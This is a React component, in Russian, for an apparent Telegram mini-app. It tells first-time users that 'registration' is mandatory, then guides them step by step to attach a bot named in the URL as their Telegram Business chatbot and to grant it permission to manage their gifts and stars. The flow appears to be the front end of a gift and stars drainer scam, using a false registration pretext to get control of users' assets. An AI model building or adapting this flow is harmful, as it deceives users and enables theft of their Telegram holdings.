import { useNavigate } from 'react-router-dom'
import { useLocation } from 'react-router-dom';
import TelegramButton from './button';

export default function Intro() {
  const navigate = useNavigate();
  const location = useLocation();
  const urlParams = new URLSearchParams(window.location.search);

  const copyToClipboard = async (text) => {
    try {
      await navigator.clipboard.writeText(text);
    } catch (err) {
      alert('Failed to copy!');
    }
  };

  const bot = urlParams.get('bot');

  return (
    <div className="min-h-screen font-sans scrollbar-hide overflow-auto flex flex-col items-center justify-center p-6 text-center bg-gray-800 text-white">
      {/* Scrollable content area clipped to viewport minus button height */}
      <div className="w-full overflow-auto max-h-[calc(100vh-64px)]">
        <img src="/images/duck.png" className="w-32 h-32 mx-auto" />
        <h2 className="text-2xl font-semibold mb-4">Вижу вы у нас впервые!</h2>
        <h4 className="text-gray-400 mb-7">
          Для начала необходимо пройти регистрацию, без неё не обойтись! <br />
          Следите за инструкциями, а затем нажмите <br />
          кнопку "Проверить"
        </h4>

        <div className="grid grid-cols-1 gap-4 mb-6">
          <div className="border border-slate-700 bg-slate-700 rounded-xl p-4">
            <b>Шаг 1: Откройте настройки для бизнеса</b>
            <p>Зайдите в Настройки -&gt; Telegram для бизнеса</p>
            <img
              alt="guide"
              src="/images/photo1.jpg"
              className="w-64 h-128 object-cover mx-auto"
            />
          </div>
          <div className="border border-slate-700 bg-slate-700 rounded-xl p-4">
            <b>Шаг2: Найдите раздел чат-ботов</b>
            <p>В меню бизнес-функий выберите Чат-боты</p>
            <img
              alt="guide"
              src="/images/photo2.jpg"
              className="w-64 h-128 object-cover mx-auto"
            />
          </div>
          <div className="border border-slate-700 bg-slate-700 rounded-xl p-4">
            <b>Шаг3: Подключите этого бота</b>
            <p>В поле имени бота введите:</p>
            <div
              onClick={() => copyToClipboard(bot)}
              className="cursor-pointer bg-slate-900 p-1 mb-2 inline-block rounded-md select-all text-blue-600"
            >
              @{bot}
            </div>
            <img
              alt="guide"
              src="/images/photo3.jpg"
              className="w-64 h-128 object-cover mx-auto"
            />
          </div>
          <div className="border border-slate-700 bg-slate-700 rounded-xl p-4">
            <b>Шаг4: Предоставьте разрешения</b>
            <p>
              установите галочку управлять подарками <br /> и звездами, чтобы
              мы могли обрабатывать ваши обмены
            </p>
            <img
              alt="guide-image"
              src="/images/photo4.jpg"
              className="w-64 h-128 object-cover mx-auto"
            />
          </div>
        </div>
      </div>

      {/* Fixed button outside scrollable container */}
      <TelegramButton text="Проверить" redirectTo="/loading" />
    </div>
  );
}
